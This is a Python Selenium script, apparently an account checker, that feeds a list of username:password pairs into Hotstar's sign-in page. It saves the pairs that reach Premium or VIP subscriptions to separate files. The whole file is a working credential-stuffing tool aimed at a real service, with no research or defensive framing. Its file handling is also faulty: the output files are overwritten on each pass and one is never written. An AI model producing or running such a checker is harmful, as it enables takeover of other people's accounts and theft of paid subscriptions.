# co-created by https://github.com/RonyGigi

from selenium import webdriver
import time
from selenium.webdriver.common.keys import Keys
driver = webdriver.Chrome('')


f = open("data.txt", "r")
a = f.readlines()

for i in a:
    try:
        g = open("valid.txt", "w")
        f1 = open("premium.txt", "w")
        f2 = open("vip.txt", "w")

        b = i.split(":")
        username = b[0]
        password = b[1]
        print("\n")
        print(username, password)
        driver.get('https://www.hotstar.com/subscribe/sign-in')
        a = driver.find_element_by_class_name('email-fb-button')
        a.click()
        a = driver.find_element_by_id('emailID')
        a.send_keys(username+Keys.ENTER)
        time.sleep(1)
        a = driver.find_element_by_id('password')
        a.send_keys(password+Keys.ENTER)
        time.sleep(2)
        driver.get('https://www.hotstar.com/subscribe/my-account')
        time.sleep(4)
        try:
            b = driver.find_element_by_class_name("membership-title")
            c = driver.find_element_by_class_name("membership-desc")
            print(b.text)
            print(c.text)
            if(b.text.find("Hotstar Premium")+1):
                print("writing ti premium "+b.text)
                f1.write(username+":"+password+"\n")
            if(b.text.find("Hotstar VIP")+1):
                f2.write(username+":"+password+"\n")
        except Exception as e:
            d = driver.find_element_by_css_selector(
                ".def-btn.premium-upsell-btn")
            print(d.text)
            print("EXPIRED!!")

        driver.find_element_by_class_name("sign-out-link").click()
        time.sleep(2)
        print("\n")

        f1.close()
        f2.close()
        g.close()

    except:
        print("Wrong Credentials!!")
        pass


try:
    f1.close()
    f2.close()
    g.close()
    a.close()
except:
    pass
